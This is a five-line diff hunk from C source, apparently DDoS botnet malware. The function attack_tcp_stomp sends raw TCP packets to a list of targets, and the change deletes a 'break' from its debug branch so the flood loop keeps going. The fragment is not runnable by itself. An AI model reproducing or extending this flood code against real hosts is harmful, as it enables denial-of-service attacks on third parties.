@@ -708,7 +708,6 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
